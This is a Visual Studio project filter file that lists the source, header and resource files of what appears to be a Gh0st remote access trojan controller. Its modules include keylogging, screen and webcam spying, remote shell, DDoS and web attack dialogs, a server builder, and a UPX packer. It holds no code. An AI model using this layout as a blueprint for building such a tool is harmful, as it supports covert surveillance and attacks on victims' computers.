<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{ee83dabd-e601-47d9-b7a4-72d6231358b6}</UniqueIdentifier>
      <Extensions>cpp;c;cxx;rc;def;r;odl;idl;hpj;bat</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{2245b6ed-ae1c-4b87-897d-cabfc9008c5d}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{b7b33428-57b2-445e-ae9b-25846e04f7e8}</UniqueIdentifier>
      <Extensions>ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\common\AudioCode.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="AudioDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BmpToAvi.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="include\Buffer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BuildServer1.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ChangeGroup.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="include\CpuUsage.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DDOSAttackDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DHL_yk.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Dib.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="errlog.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FileManagerDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FileTransferModeDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Filter.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FlowAttackDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="gh0stDoc.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="gh0stView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Icons.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="IniFile.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="InputDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="include\IOCPServer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KeyBoardDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="LogView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MainFrm.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MD5.CPP">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MsgBox.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MyToolsKit.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PcView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="proxy.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="RegDataDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="RegDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SafeDynMem.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ScreenSpyDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SerAttribDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SerManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SettingDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SEU_QQwry.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ShellDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ShowNum.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StdAfx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SystemDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TrueColorToolBar.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UPDATEIP.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="User.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WaveIn.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WaveOut.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WebAttackDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WebCamDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="DHL_yk.rc">
      <Filter>Source Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\common\AudioCode.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="AudioDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BmpToAvi.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\Buffer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BuildServer1.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ChangeGroup.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DDOSAttackDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DHL_yk.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Dib.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="EasySize.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="errlog.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileManagerDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileTransferModeDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Filter.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FlowAttackDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="gh0stDoc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="gh0stView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Icons.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="IniFile.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\IOCPServer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="KeyBoardDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="LogView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\macros.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MainFrm.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MsgBox.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MyToolsKit.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PcView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="proxy.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="RegDataDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="RegDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SafeDynMem.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ScreenSpyDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SerAttribDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SerManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SettingDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SEU_QQwry.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ShellDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\..\..\VC6_SDK\Include\Shlwapi.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ShowNum.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SkinH.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="StdAfx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SystemDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TrueColorToolBar.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UPDATEIP.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="User.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WaveIn.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WaveOut.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WebAttackDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WebCamDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <Image Include="res\102.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ico2\11.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\202.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ico2\22.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\SysInfo\AppWindows.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\audio.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Becareful.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Bitmap_4.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Bitmap_5.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ico3\Burn.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\cmdshell.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\CS icon.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\dword.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\event.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\EventError.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\gh0st.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\SysInfo\Informacion.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\keyboard.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\monitor.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\mytool.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\n_ip.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\SysInfo\Process.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\regedit.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\regsz.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\remote.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\SysInfo\ScreenSize.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\SysInfo\Services.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\syskm.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\system.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\systray1.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar1.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar2.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar4.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\w_ip.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\webcam.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\实用工具.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\文件夹1.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\文件夹2.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ico2\用户0.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ico3\SmallIcons.png" />
  </ItemGroup>
  <ItemGroup>
    <Media Include="res\Login.wav" />
    <Media Include="res\Offline.wav" />
    <Media Include="res\Setting.wav" />
  </ItemGroup>
  <ItemGroup>
    <CustomBuild Include="res\1.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\2.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\3.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\4.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\default1.bin">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\dot.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\gh0st.rc2">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\aero.she" />
    <CustomBuild Include="res\upx.exe" />
  </ItemGroup>
</Project>